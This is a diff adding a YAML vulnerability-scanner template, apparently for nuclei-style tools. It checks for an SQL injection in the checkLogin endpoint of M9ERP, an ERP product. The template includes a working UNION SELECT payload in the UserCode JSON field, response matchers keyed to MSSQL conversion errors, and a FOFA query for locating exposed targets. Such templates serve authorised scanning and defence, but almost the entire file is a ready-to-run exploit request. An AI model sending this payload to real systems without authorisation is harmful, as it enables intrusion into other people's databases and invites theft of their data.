@@ -1,0 +1,27 @@
+id: poc-yaml-m9erp-checklogin-sqli
+info:
+  name: M9ERP checkLogin SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: m9erp
+  fofa: body="M9ERP"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /UserWH/checkLogin
+  headers:
+    Content-Type: application/json
+  data: '{
+
+    "UserCode": "123'' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,sys.fn_varbintohexstr(hashbytes(''MD5'',''{{.t1}}''))--
+    ugAI",
+
+    "UserPsw": "123"
+
+    }'
+  expression: "status_code == 200 && \ncontains(body,\"在将 nvarchar 值\") &&\ncontains(body,\"\
+    0x\"+t2) &&\ncontains(body,\"转换成数据类型 int 时失败\") &&\n!contains(body,\"<\")\n"
+transport: http
